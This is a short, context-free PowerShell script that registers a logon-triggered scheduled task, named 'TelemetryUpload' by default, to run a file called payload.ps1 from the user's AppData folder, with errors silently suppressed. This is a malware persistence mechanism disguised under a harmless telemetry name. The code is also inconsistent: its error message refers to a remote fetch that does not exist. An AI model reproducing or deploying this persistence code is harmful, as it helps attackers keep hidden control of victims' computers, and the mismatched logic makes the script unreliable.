[CmdletBinding()]
param(
    [string]$TaskName = 'TelemetryUpload',
    [string]$ScriptPath = "$env:APPDATA\payload.ps1"
)
try { $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument ("-NoP -File `"" + $ScriptPath + "`""); Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Remote fetch failed" }
